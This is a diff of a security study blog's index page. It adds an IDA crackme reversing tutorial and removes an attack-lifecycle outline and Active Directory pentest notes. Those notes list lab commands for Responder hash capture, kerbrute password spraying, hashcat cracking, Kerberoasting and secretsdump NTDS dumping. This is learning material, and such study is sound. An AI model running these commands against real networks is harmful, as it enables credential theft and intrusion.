@@ -126,6 +126,119 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Crackme2/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Crackme2/">
+        IDA - Crack me2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Crack-me2"><a href="#Crack-me2" class="headerlink" title="Crack me2"></a>Crack me2</h1><p>使用IDA進行反編譯及創建結構</p>
+<p>執行檔案看看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme (1)/crackme$ ./crackme2</span><br><span class="line">enter key:dde</span><br><span class="line">enter serial:</span><br><span class="line">Wrong</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>原始碼</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">struct Keybank &#123;</span><br><span class="line"></span><br><span class="line">	int key;</span><br><span class="line">	int serial;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">success</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCorrect\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">fail</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	int key = 0;</span><br><span class="line">	int serial = 0;</span><br><span class="line"></span><br><span class="line">	struct Keybank kb;</span><br><span class="line"></span><br><span class="line">  kb.key = 1337;</span><br><span class="line">	kb.serial = 1;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter serial:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;serial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( key == kb.key &amp;&amp; serial == kb.serial) success();</span><br><span class="line">	<span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>開啟IDA並反編譯</p>
+<p>View &gt; Open subviews&gt;Generate pseudocode</p>
+<p>快捷鍵 <code>F5</code> </p>
+<p><img src="/img/revcra2_Untitled.png" alt="Untitled"></p>
+<p>可以通過重新命名讓程式比較容易理解</p>
+<p>比如這邊是要求用戶輸入key → v4</p>
+<ul>
+<li>按 <code>n</code> 重命名</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/revcra2_Untitled_1.png" alt="Untitled"></p>
+<p>另一個v5也通過n命名成serial</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br></pre></td></tr></table></figure>
+
+<p>v6 、 v7 是結構，進入結構創建一個新的結構</p>
+<p><img src="/img/revcra2_Untitled_2.png" alt="Untitled"></p>
+<p>fn+ins 或是右鍵選擇Add struct.. &gt; 命名 keybank</p>
+<p><img src="/img/revcra2_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_4.png" alt="Untitled"></p>
+<p>再來插入兩個成員及兩個欄位，並命名變數名稱，對欄位按 n</p>
+<p><img src="/img/revcra2_Untitled_5.png" alt="Untitled"></p>
+<p>按兩次 <code>d</code> 才是 4 bytes</p>
+<ul>
+<li>int → 4 bytes</li>
+<li>double → 8 bytes</li>
+<li>char → 1 bytes</li>
+</ul>
+<p><img src="/img/revcra2_Untitled_6.png" alt="Untitled"></p>
+<p>把這結構加到C程式中</p>
+<p>對 <code>v6</code> 按 <code>y</code> 並取名前面命名的struct的名稱&gt; set the type</p>
+<p><img src="/img/revcra2_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_9.png" alt="Untitled"></p>
+<p>重新命名v6 &gt; Keybank</p>
+<p><img src="/img/revcra2_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li>修改變數名稱使程式更易讀</li>
+<li>進行分析時知道更多訊息，隨時可以修改變數名稱</li>
+</ul>
+<p>如果想把這邊的程式視圖與反彙編視圖同步</p>
+<p>右鍵&gt;Synchrinize..&gt;IDA VIew A…</p>
+<p>通過點擊程式碼的位置可以注意到跟視圖的位置是同步的，綠色區塊</p>
+<p><img src="/img/revcra2_Untitled_12.png" alt="Untitled"></p>
+<p>也可以雙擊凾式看到裡面的反編譯後的程式碼</p>
+<p><img src="/img/revcra2_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/revcra2_Untitled_15.png" alt="Untitled"></p>
+<p>可以併排停靠在一個視窗中，比較方便查看</p>
+<p>到視圖中F5反編譯程式碼後，將反編譯的視窗拖曳到主視圖的右側位置</p>
+<p><img src="/img/revcra2_Untitled_16.png" alt="Untitled"></p>
+<p>這樣是最快瀏覽及對照程式運行過程的方式</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="privilege-Capstone-Privilege" class="article article-type-privilege" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -4036,332 +4149,6 @@ Spot 執行個體</p>
 <li>Think outside the box</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└── Initial Reconnaissance</span><br><span class="line">    ├── Identify Targets</span><br><span class="line">    │   ├── Systems</span><br><span class="line">    │   │   ├── Web Servers</span><br><span class="line">    │   │   ├── Database Servers</span><br><span class="line">    │   │   ├── Email Servers</span><br><span class="line">    │   │   └── Employee Workstations</span><br><span class="line">    │   └── People</span><br><span class="line">    │       ├── Key Personnel (e.g., Executives, IT Admins)</span><br><span class="line">    │       ├── Employees with Access to Sensitive Information</span><br><span class="line">    │       └── Employees Active on Social Media</span><br><span class="line">    ├── Determine Attack Methodology</span><br><span class="line">    │   ├── Identify Vulnerable Websites</span><br><span class="line">    │   │   ├── Search <span class="keyword">for</span> Websites with Outdated Software</span><br><span class="line">    │   │   ├── Scan <span class="keyword">for</span> Common Web Application Vulnerabilities (e.g., SQL Injection, XSS)</span><br><span class="line">    │   │   └── Target Specific Web Applications (e.g., CMS, CRM)</span><br><span class="line">    │   ├── Analyze Business Activities</span><br><span class="line">    │   │   ├── Monitor Publicly Available Information (e.g., Press Releases, Financial Reports)</span><br><span class="line">    │   │   └── Identify Potential Points of Exploitation (e.g., Upcoming Mergers)</span><br><span class="line">    │   ├── Understand Internal Organization</span><br><span class="line">    │   │   ├── Gather Employee Information from LinkedIn, Company Websites</span><br><span class="line">    │   │   └── Map Organizational Structure (e.g., Departments, Reporting Lines)</span><br><span class="line">    │   ├── Research Employee Conferences</span><br><span class="line">    │   │   ├── Identify Conferences Relevant to Target Industry</span><br><span class="line">    │   │   └── Gather Information on Attending Employees</span><br><span class="line">    │   └── Browse Social Media</span><br><span class="line">    │       ├── Profile Employees <span class="keyword">for</span> Social Engineering Attacks</span><br><span class="line">    │       ├── Gather Information on Employee Interests, Activities</span><br><span class="line">    │       └── Identify Potential Insider Threats</span><br><span class="line">    └── Conduct Research Activities</span><br><span class="line">        ├── Gather Information from Publicly Available Sources</span><br><span class="line">        ├── Use OSINT Tools (e.g., Shodan, Maltego) to Identify Targets</span><br><span class="line">        └── Analyze Collected Data <span class="keyword">for</span> Attack Surface Expansion</span><br><span class="line"></span><br><span class="line">└── Initial Compromise</span><br><span class="line">    └── Execute Malicious Code</span><br><span class="line">        ├── Social Engineering</span><br><span class="line">        │   ├── Craft Spear Phishing Emails Impersonating Trusted Entities</span><br><span class="line">        │   ├── Attach Malicious Documents/Links to Emails</span><br><span class="line">        │   └── Exploit Psychological Manipulation Techniques</span><br><span class="line">        ├── Exploit Vulnerability</span><br><span class="line">        │   ├── Exploit Known Vulnerabilities <span class="keyword">in</span> Internet-facing Systems (e.g., CVEs)</span><br><span class="line">        │   ├── Target Zero-Day Vulnerabilities</span><br><span class="line">        │   └── Utilize Exploit Kits (e.g., Metasploit) <span class="keyword">for</span> Automated Attacks</span><br><span class="line">        └── Other Means</span><br><span class="line">            ├── Physical Access Exploitation (e.g., USB Drop Attacks)</span><br><span class="line">            ├── Supply Chain Attacks (e.g., Compromised Software Updates)</span><br><span class="line">            └── Insider Collusion (e.g., Bribery, Coercion)</span><br><span class="line"></span><br><span class="line">└── Establish Foothold</span><br><span class="line">    └── Install Persistent Backdoor</span><br><span class="line">        ├── Plant Rootkits <span class="keyword">in</span> System Firmware</span><br><span class="line">        ├── Hide Malicious Processes via Process Injection Techniques</span><br><span class="line">        └── Create Scheduled Tasks <span class="keyword">for</span> Stealthy Execution</span><br><span class="line">    └── Download Additional Malware</span><br><span class="line">        ├── Fetch Remote Payloads from C&amp;C Servers</span><br><span class="line">        ├── Install Remote Access Trojans (RATs) <span class="keyword">for</span> Control</span><br><span class="line">        └── Deploy Keyloggers <span class="keyword">for</span> Credential Harvesting</span><br><span class="line">    └── Maintain Control</span><br><span class="line">        ├── Evade Detection with Anti-Forensic Techniques</span><br><span class="line">        ├── Implement Traffic Encryption to Avoid IDS/IPS Detection</span><br><span class="line">        └── Continuously Monitor System Activity <span class="keyword">for</span> Anomalies</span><br><span class="line"></span><br><span class="line">└── Escalate Privileges</span><br><span class="line">    └── Obtain Greater Access</span><br><span class="line">        ├── Password Hash Dumping</span><br><span class="line">        │   ├── Exploit Vulnerable Services <span class="keyword">for</span> Hash Retrieval</span><br><span class="line">        │   ├── Utilize Tools like Mimikatz <span class="keyword">for</span> Dumping LSASS Memory</span><br><span class="line">        │   └── Extract Hashes from Local SAM Database</span><br><span class="line">        ├── Keystroke/Credential Logging</span><br><span class="line">        │   ├── Deploy Keyloggers at System Level</span><br><span class="line">        │   └── Intercept User Credentials during Authentication</span><br><span class="line">        └── Exploiting Vulnerable Software</span><br><span class="line">            ├── Exploit Privilege Escalation Vulnerabilities (e.g., Windows UAC Bypass)</span><br><span class="line">            ├── Abuse Misconfigured Services <span class="keyword">for</span> Elevated Access</span><br><span class="line">            └── Hijack Privileged Processes (e.g., DLL Injection)</span><br><span class="line"></span><br><span class="line">└── Internal Reconnaissance</span><br><span class="line">    └── Explore Victim<span class="string">&#x27;s Environment</span></span><br><span class="line"><span class="string">        ├── Understand Environment</span></span><br><span class="line"><span class="string">        │   ├── Enumerate Network Topology</span></span><br><span class="line"><span class="string">        │   ├── Identify Active Directory Structure</span></span><br><span class="line"><span class="string">        │   └── Map Internal Services (e.g., File Shares, Databases)</span></span><br><span class="line"><span class="string">        ├── Identify Key Individuals</span></span><br><span class="line"><span class="string">        │   ├── Identify Domain Admins and Power Users</span></span><br><span class="line"><span class="string">        │   ├── Profile Employees with Access to Sensitive Data</span></span><br><span class="line"><span class="string">        │   └── Determine Employee Roles and Responsibilities</span></span><br><span class="line"><span class="string">        └── Determine Information Locations</span></span><br><span class="line"><span class="string">            ├── Identify High-Value Data Repositories</span></span><br><span class="line"><span class="string">            ├── Analyze File System Permissions</span></span><br><span class="line"><span class="string">            └── Enumerate Database Contents for Valuable Information</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Move Laterally</span></span><br><span class="line"><span class="string">    └── Access Network Shares</span></span><br><span class="line"><span class="string">        ├── Exploit Weak SMB/CIFS Permissions</span></span><br><span class="line"><span class="string">        ├── Utilize Pass-the-Hash Attacks for Authentication</span></span><br><span class="line"><span class="string">        └── Transfer Malicious Payloads via Shared Folders</span></span><br><span class="line"><span class="string">    └── Execute Programs via Task Scheduler</span></span><br><span class="line"><span class="string">        ├── Abuse Scheduled Tasks for Code Execution</span></span><br><span class="line"><span class="string">        └── Schedule Stealthy Malware Execution for Persistence</span></span><br><span class="line"><span class="string">    └── Use Remote Access Tools</span></span><br><span class="line"><span class="string">        ├── PsExec</span></span><br><span class="line"><span class="string">        │   ├── Execute Commands Remotely on Target Systems</span></span><br><span class="line"><span class="string">        │   └── Bypass UAC Restrictions for Admin Access</span></span><br><span class="line"><span class="string">        ├── RDP</span></span><br><span class="line"><span class="string">        │   ├── Remotely Control Systems with RDP Protocol</span></span><br><span class="line"><span class="string">        │   └── Exploit Weak RDP Credentials for Access</span></span><br><span class="line"><span class="string">        └── VNC</span></span><br><span class="line"><span class="string">            ├── Establish Remote Desktop Sessions for Control</span></span><br><span class="line"><span class="string">            └── Exploit VNC Authentication Weaknesses</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Maintain Presence</span></span><br><span class="line"><span class="string">    └── Install Malware Backdoors</span></span><br><span class="line"><span class="string">        ├── Deploy Reverse Shells for Persistent Access</span></span><br><span class="line"><span class="string">        ├── Implement RATs for Remote Control</span></span><br><span class="line"><span class="string">        └── Establish VPN Tunnels for Stealthy Communication</span></span><br><span class="line"><span class="string">    └── Gain Access to Remote Access Services</span></span><br><span class="line"><span class="string">        ├── Compromise Corporate VPNs with Stolen Credentials</span></span><br><span class="line"><span class="string">        └── Exploit Weaknesses in Remote Desktop Services for Access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Complete Mission</span></span><br><span class="line"><span class="string">    └── Accomplish Goal</span></span><br><span class="line"><span class="string">        ├── Steal Information</span></span><br><span class="line"><span class="string">        │   ├── Exfiltrate Data via Encrypted Channels</span></span><br><span class="line"><span class="string">        │   ├── Harvest Financial Documents, Intellectual Property, PII</span></span><br><span class="line"><span class="string">        │   └── Cover Tracks to Avoid Detection</span></span><br><span class="line"><span class="string">        └── Maintain Access</span></span><br><span class="line"><span class="string">            ├── Establish Secondary Backdoors for Future Access</span></span><br><span class="line"><span class="string">            └── Leave Traces for Reconnaissance on Next Target</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-ActiveDirectory" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/ActiveDirectory/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.069Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/ActiveDirectory/">
-        Active Directory Technology
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h1><p>在內網滲透中，當攻擊者取得內網某台機器的控制權後，會以被攻陷的主機為跳板，透過收集域內憑證等各種方法，存取域內其他機器，進一步擴大資產範圍。透過此類手段，攻擊者最終可能獲得網域控制器的存取權限，甚至完全控制基於Windows作業系統的整個內部網路環境，控制網域環境下的全部機器。</p>
-<p>目錄服務 (例如 Active Directory Domain Services (AD DS)) 提供儲存目錄資料的方法，並使這些資料可供網路使用者與系統管理員使用。 例如，AD DS 會儲存使用者帳戶的相關資訊，例如名稱、密碼、電話號碼等，並讓相同網路上的其他授權使用者存取這項資訊。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/nirajkharel/AD-Pentesting-Notes">https://github.com/nirajkharel/AD-Pentesting-Notes</a></p>
-<ul>
-<li><p>Directory service developed by Microsoft to manage Windows domain networks</p>
-</li>
-<li><p>Stores information related to objects,such as Computers,Users,Printers,etc.</p>
-<ul>
-<li>Think about it as a phone book for Windows</li>
-</ul>
-</li>
-<li><p>Authenticates using Kerberos tickets.</p>
-<ul>
-<li>Non-Windows devices,such as Linux machines,firewalls,etc.can also authenticate to Active Directory via RADIUS or LDAP</li>
-</ul>
-</li>
-<li><p>All the directory is a identity management service</p>
-</li>
-<li><p>only for windows machines</p>
-</li>
-<li><p>Active Directory is the most commonly used identity management service in the world</p>
-<ul>
-<li>95%of Fortune 1000 companies implement the service in their networks (<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/Enterprise-">https://techcommunity.microsoft.com/t5/Enterprise-</a>Mobility-Security&#x2F;Success-with-Enterprise-Mobility-ldentity&#x2F;ba-p&#x2F;248613)</li>
-</ul>
-</li>
-<li><p>Can be exploited without ever attacking patchable exploits.  Instead,we abuse features,trusts,components,and more.</p>
-</li>
-</ul>
-<h2 id="Active-Directory-Components"><a href="#Active-Directory-Components" class="headerlink" title="Active Directory Components"></a>Active Directory Components</h2><ul>
-<li><p>physical components</p>
-<ul>
-<li>Data store</li>
-<li>Domain controllers<ul>
-<li>A domain controller is a server with the AD DS server role installed that has specifically been promoted to a domain controller<ul>
-<li>Host a copy of the AD DS directory store</li>
-<li>Provide authentication and authorization services</li>
-<li>Replicate updates to other domain controllers in the domain and forest</li>
-<li>Allow administrative access to manage user accounts and network resources</li>
-<li>control everything</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Global catalog server</li>
-<li>Read-Only Domain Controller (RODC)</li>
-<li>AD DS Data Store<ul>
-<li>The AD DS data store contains the <strong>database files</strong> and processes that store and <strong>manage directory information</strong> for users, services, and applications</li>
-<li>Consists of the Ntds.dit file<ul>
-<li>在入侵網域控制站後，我們想要取得這個 ntds.dit 檔。它包含儲存在活動目錄中的所有內容。所有<strong>哈希值都儲存在該檔案中</strong>。</li>
-</ul>
-</li>
-<li>Allowed to pull stored password hashes</li>
-<li>Is stored by default in the <strong>%SystemRoot%\NTDS</strong> folder on all domain controllers</li>
-<li>Is accessible only through the domain controller processes and protocols</li>
-<li>可以在目錄中建立哪些對象，例如機器使用者和電腦。可以附加到物件的資訊。顯示名稱等。定義可以儲存在目錄中的每種項目類型。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>logical components</p>
-<ul>
-<li><p>Partitions</p>
-</li>
-<li><p>Schema</p>
-</li>
-<li><p>Domains</p>
-</li>
-<li><p>域用於對組織中的物件進行分組和管理。物件可以是印表機、群組等。</p>
-<ul>
-<li>Domains are <strong>used to group and manage objects</strong> in an organization<ul>
-<li>user、computer、printer…</li>
-</ul>
-</li>
-<li>An administrative boundary for applying policies to groups of objects</li>
-<li>A replication boundary for replicating data between domain controllers</li>
-<li>An authentication and authorization boundary that provides a way to limit the scope of access to resources</li>
-<li>XX.com, XXX.tw, <a target="_blank" rel="noopener" href="http://xxx.org/">XXX.org</a> …</li>
-</ul>
-</li>
-<li><p>Domain trees</p>
-<ul>
-<li>A domain tree is a hierarchy of domains in AD DS<ul>
-<li>parent domain - children domain -  children domain</li>
-<li><a target="_blank" rel="noopener" href="http://contonso.com/">contonso.com</a> - <a target="_blank" rel="noopener" href="http://emea.contoso.com/">emea.contoso.com</a> - na.contoso.com</li>
-<li>Share a contiquous namespace with the parent domain</li>
-<li>Can have additional child domains</li>
-<li>By default create a two-way transitive trust with other domains</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Forests</p>
-<ul>
-<li>A forest is a collection of</li>
-<li>bunch of trees &gt; forest</li>
-<li>one or more domain trees</li>
-<li>Share a common schema</li>
-<li>Share a common configuration partition</li>
-<li>Share a common global catalog to enable searching</li>
-<li>Enable trusts between all domains in the forest</li>
-<li>Share the Enterprise Admins and Schema Admins groups</li>
-<li>compromise a domain admin in a forest</li>
-<li>elevate to an enterprise admin - be able to cross forest with that account</li>
-</ul>
-</li>
-<li><p>Sites</p>
-</li>
-<li><p>Organization units (OUs)</p>
-<ul>
-<li>OUs are <strong>Active Directory containers</strong> that can contain users,groups,computers,and<br>  other OUs</li>
-<li>Represent your organization hierarchically and logically</li>
-<li>Manage a collection of objects in a consistent way</li>
-<li>Delegate permissions to administer groups of objects</li>
-<li>Apply policies</li>
-</ul>
-</li>
-<li><p>Trusts</p>
-<ul>
-<li><p>Trusts provide a mechanism for users to gain access to resources in another domain</p>
-<p>  <img src="/img/AD_Untitled.png" alt="Untitled"></p>
-</li>
-<li><p>All domains in a forest trust all other domains in the forest</p>
-</li>
-<li><p>Trusts can extend outside the forest</p>
-</li>
-</ul>
-</li>
-<li><p>Defines every type of object that can be stored in the directory</p>
-</li>
-<li><p>Enforces rules regarding object creation and configuration</p>
-</li>
-<li><p>Like rule book 、 buleprint</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Object Types</th>
-<th>Function</th>
-<th>Examples</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Class Object</td>
-<td>What objects can be created in the directory</td>
-<td></td>
-</tr>
-</tbody></table>
-<ul>
-<li>user、computer、printer… | + User</li>
-<li>Computer |<br>  | Attribute Object | Information that can be attached to an object | + Display name |</li>
-</ul>
-</li>
-<li><p>Objects</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>Object</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>User</td>
-<td>Enables network resource access for a user</td>
-</tr>
-<tr>
-<td>InetOrgPerson</td>
-<td>Similar to a user account</td>
-</tr>
-<tr>
-<td>Contacts</td>
-<td>Used primarily to assign e-mail addresses to external users</td>
-</tr>
-<tr>
-<td>Groups</td>
-<td>Used to simplify the administration of access control</td>
-</tr>
-<tr>
-<td>Computers</td>
-<td>Enables authentication and auditing of computer access to resources</td>
-</tr>
-<tr>
-<td>Printers</td>
-<td>Used to simplify the process of locating and connecting to printers</td>
-</tr>
-<tr>
-<td>Shared folders</td>
-<td>Enables users to search for shared folders based on properties</td>
-</tr>
-</tbody></table>
-<p><img src="/img/AD_Untitled_1.png" alt="Untitled"></p>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>sudo responder -I ens224 -A</td>
-<td>Start Responder in analysis mode</td>
-</tr>
-<tr>
-<td>sudo responder -I ens224 -w -d</td>
-<td>Start network traffic response spoofing with Responder to gather NTLMv2 password hashes</td>
-</tr>
-<tr>
-<td>kerbrute userenum -d INLANEFREIGHT.LOCAL –dc 172.16.5.5 jsmith.txt -o kerb-results</td>
-<td>Enumerate valid Active Directory users for password spraying</td>
-</tr>
-<tr>
-<td>hashcat -m 5600 bsmith_ntlmv2 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</td>
-<td>Attempt to crack an NTLMv2 password hash gathered with Responder using Hashcat</td>
-</tr>
-<tr>
-<td>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 –pass-pol</td>
-<td>Enumerate the domain password policy using CrackMapExec</td>
-</tr>
-<tr>
-<td>crackmapexec smb 10.129.203.121 -u ‘’ -p ‘’ –users –export $(pwd)&#x2F;users.txt</td>
-<td>Check for SMB NULL sessions on a domain controller host and enumerate valid users</td>
-</tr>
-<tr>
-<td>enum4linux -P 172.16.5.5</td>
-<td>Leverage an SMB NULL session on a domain controller host to verify the domain password policy</td>
-</tr>
-<tr>
-<td>kerbrute passwordspray -d inlanefreight.local –dc 172.16.5.5 valid_users.txt Welcome1</td>
-<td>Perform a password spraying attack using the Kerbrute tool</td>
-</tr>
-<tr>
-<td>Import-Module ActiveDirectory</td>
-<td>Load the built-in Active Directory PowerShell module on a Windows host</td>
-</tr>
-<tr>
-<td>Get-ADUser -Filter *</td>
-<td>select Name</td>
-</tr>
-<tr>
-<td>Get-DomainUser *</td>
-<td>Select-Object samaccountname,description</td>
-</tr>
-<tr>
-<td>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL&#x2F;mholliday</td>
-<td>Kerberoast from a Linux attack host</td>
-</tr>
-<tr>
-<td>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u bsmith -p Welcome1</td>
-<td>Run the BloodHound Python version from a Linux attack host to map out the domain</td>
-</tr>
-<tr>
-<td>SharpHound.exe -c all –zipfilename inlanefreight_bloodhound</td>
-<td>Run the SharpHound C# ingestor from a Windows attack host to map out the domain</td>
-</tr>
-<tr>
-<td>Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound</td>
-<td>Run the SharpHound PowerShell ingestor from a Windows attack host to map out the domain</td>
-</tr>
-<tr>
-<td>Rubeus.exe kerberoast &#x2F;ldapfilter:’admincount&#x3D;1’ &#x2F;nowrap</td>
-<td>Kerberoast admin accounts using the Rubeus tool from a Windows attack host</td>
-</tr>
-<tr>
-<td>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT&#x2F;<a href="mailto:&#97;&#100;&#x75;&#x6e;&#x6e;&#64;&#49;&#x37;&#x32;&#46;&#x31;&#x36;&#46;&#53;&#x2e;&#53;">&#97;&#100;&#x75;&#x6e;&#x6e;&#64;&#49;&#x37;&#x32;&#46;&#x31;&#x36;&#46;&#53;&#x2e;&#53;</a> -use-vss</td>
-<td>Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking</td>
-</tr>
-</tbody></table>
-<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide">https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a></p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411">https:&#x2F;&#x2F;medium.com&#x2F;@awabrajpoot88&#x2F;active-directory-inital-attack-vectors-2-8479bed79411</a></p>
-
       
     </div>
     
